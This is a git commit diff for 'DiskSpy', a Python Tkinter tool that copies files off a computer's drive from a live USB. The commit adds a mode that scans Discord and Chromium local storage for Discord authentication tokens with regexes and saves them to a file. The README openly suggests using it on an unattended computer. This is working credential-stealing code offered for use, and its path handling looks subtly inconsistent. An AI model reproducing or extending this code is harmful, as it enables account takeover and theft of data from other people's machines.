e8c7e78694815cd74b99b166b1d6e020571e2730
kl3sshydra <ciroespositorubaorologi000@gmail.com>
2022-03-19 13:44:25 +0100

    main

--- DiskSpy/DISK_SPY.py
+++ DiskSpy/DISK_SPY.py
@@ -4,7 +4,7 @@
 # https://github.com/kl3sshydra
 # version 1.2
 
-import os, shutil, json, datetime, threading
+import os, shutil, json, datetime, threading, re
 from tkinter import *
 
 # the name of the folder
@@ -29,8 +29,8 @@ checkFiletextContains = True
 # will have to show
 mountpoints = os.popen("lsblk").read()
 lines_in_mountpoints = mountpoints.count('\n')
-width = "700"
-height = "455"
+width = "600"
+height = "400"
 height = str((int(height)*lines_in_mountpoints)/8).split(".")[0]
 width = str((int(width)*int(height))/455).split(".")[0]
 windowsize = width+"x"+height
@@ -46,8 +46,12 @@ extensions = configlists['extensions']
 if os.path.exists(saving_dir) == False:
 	os.mkdir(saving_dir)
 
-
 class diskspy:
+
+	# list for already found
+	# discord tokens
+	tks = []
+
 	# function that determines
 	# if a file is interesting or not
 	def isInteresting(self, f):
@@ -70,8 +74,35 @@ class diskspy:
 					if (e in line):
 						flag = True
 			f2.close()
-
 		return flag
+	
+
+	# function to recover discord tokens from
+	# selected hard drive
+	def dstoken(self, disco, t):
+		t.insert(END, "Please wait...\n")
+		osuser = os.listdir(f"{disco}/home/")
+		for user in osuser:
+			t.insert(END, f"Selected username: {user}\n")
+			pathlist = [
+				"/home/"+str(user).strip()+"/.config/discord/Local Storage/leveldb",
+				"/home/"+str(user).strip()+"/.config/chromium/Default/Local Storage/leveldb",
+			]
+			for p in pathlist:
+				if os.path.exists(p):
+					f = open("tokens.txt", "a")
+					t.insert(END, f"Analyzing {p}\n")
+					for file_name in os.listdir(p):
+						if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+							continue
+						for line in [x.strip() for x in open(f'{p}/{file_name}', errors='ignore').readlines() if x.strip()]:
+							for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+								for token in re.findall(regex, line):
+									if token not in diskspy.tks:
+										diskspy.tks.append(token)
+										diskspy.writelogs(t, f"Found: \"{token}\"")
+										f.write(token+"\n")
+					f.close()
 
 	# thread for the realstart function
 	def realstart(self, disco, t):
@@ -102,53 +133,54 @@ class diskspy:
 		t.insert(END, text+"\n")
 		t.see("end")
 
-	def hello(self):
-		print("hello")
-		
+	# radio buttons option selector
+	def sel(self, mode, w):
+		w.destroy()		
+		diskspy.main(mode)	
 
 	# main function for our program
-	def main(self):
+	def main(self, mode):
 		finestra = Tk()
 		finestra.geometry(windowsize)
 		finestra.configure(bg=background)
 		finestra.title("DiskSpy by kl3sshydra")
 
+
 		label = Label(finestra, text="SELECT MOUNTPOINT ->   ", bg=background, fg=foreground)
 		label.grid(column=0, row=1)
-
 		mountpoint = Text(finestra, height=2, width=40, bg=background, fg=foreground)
 		mountpoint.grid(column=1, row=1)
-
 		# empty vertical space
 		label = Label(finestra, bg=background, fg=foreground)
 		label.grid(column=0, row=2)
-
 		label = Label(finestra, text="MOUNTPOINT LIST:", bg=background, fg=foreground)
 		label.grid(column=0, row=3)
-
-		
 		label = Label(finestra, text=mountpoints, bg=background, fg=foreground)
 		label.grid(column=0, row=4)
-
 		# empty vertical space
 		label = Label(finestra, bg=background, fg=foreground)
 		label.grid(column=0, row=5)
-
 		label = Label(finestra, text="LOGS", bg=background, fg=foreground)
 		label.grid(column=0, row=6)
-
-		t = Text(finestra, width=40,  height=7, bg=background, fg=foreground, wrap = NONE)
+		t = Text(finestra, width=45,  height=7, bg=background, fg=foreground, wrap = NONE)
 		t.grid(column=0, row=7)
-
-		startbutton = Button(finestra, text ="START", bg=background, fg=foreground, activebackground=background, activeforeground=foreground, height=2, width=20, command=lambda: diskspy.start(mountpoint.get("1.0",'end-1c'), t))
+		if mode == "normal":
+			startbutton = Button(finestra, text ="START", bg=background, fg=foreground, activebackground=background, activeforeground=foreground, height=2, width=20, command=lambda: diskspy.start(mountpoint.get("1.0",'end-1c'), t))
+		else:
+			startbutton = Button(finestra, text ="START", bg=background, fg=foreground, activebackground=background, activeforeground=foreground, height=2, width=20, command=lambda: diskspy.dstoken(mountpoint.get("1.0",'end-1c'), t))
 		startbutton.grid(column=1, row=3)
-		
 		label = Label(finestra, text=info, bg=background, fg=foreground)
 		label.grid(column=1, row=7)
-
-		diskspy.writelogs(t,"Started at "+str(datetime.datetime.now()))
+		# mode selector (radio buttons)
+		label = Label(finestra, text="\n"*8+"MODE:", bg=background, fg=foreground)
+		label.grid(column=1, row=4)
+		R1 = Radiobutton(finestra, text="Files",value=1,padx = 31,bg=background, fg=foreground, activebackground=background, activeforeground=foreground,command= lambda: diskspy.sel("normal", finestra))
+		R1.grid(column=1, row=5)
+		R2 = Radiobutton(finestra, text="Discord tokens",value=2,bg=background, fg=foreground, activebackground=background, activeforeground=foreground,command= lambda: diskspy.sel("discord", finestra))
+		R2.grid(column=1, row=6)
+		diskspy.writelogs(t,"Started "+mode+" mode -> "+str(datetime.datetime.now()))
 
 		finestra.mainloop()
 
 diskspy = diskspy()
-diskspy.main()
+diskspy.main("normal")
--- README.md
+++ README.md
@@ -2,22 +2,35 @@
 recover data from external hard disks
 
 # What is this for?
-Scenario 1:<br>
-you dont know your computer's password and you want to recover some important files, such as pdf's, from your hard drive<br>
-
-Scenario 2:<br>
+```
+Scenario 1:
+you dont know your computer's password and you want to recover some important files, such as pdf's, from your hard drive
+```
+```
+Scenario 2:
 you see an unattended computer and you really want to go to jail
+```
 
 # How do i use it?
-1) Burn any linux live iso into a usb (debian-based ones are recommended)<br>
-2) Launch the live iso on a pc<br>
-3) Launch this program from the live iso<br>
-4) Select the mountpoint of your hard drive<br>
-5) Sit and wait for the program to save the files<br>
-6) Shut down the pc and now you have the files inside of your usb stick<br>
+```
+1) Burn any linux live iso into a usb (debian-based ones are recommended)
+2) Launch the live iso on a pc
+3) Launch this program from the live iso
+4) Select the mountpoint of your hard drive
+5) Sit and wait for the program to save the files
+6) Shut down the pc and now you have the files inside of your usb stick
+```
 
 # Screenshot
 ![alt text](https://github.com/kl3sshydra/diskSpy/raw/main/screenshot.png)
+
+# Can't i just do it by myself?
+```
+the answer is: yes and no.
+you can be faster than this program in the process of recovering important files from your hard drive
+only if the disk is relatively small, but if you have to deal with a 500gb disk full of data, this program
+could help you be faster
+```
 
 # Disclaimer
 i do not encourage illegal activity nor i am responsible in any way for any illegal actions done with this software.<br>
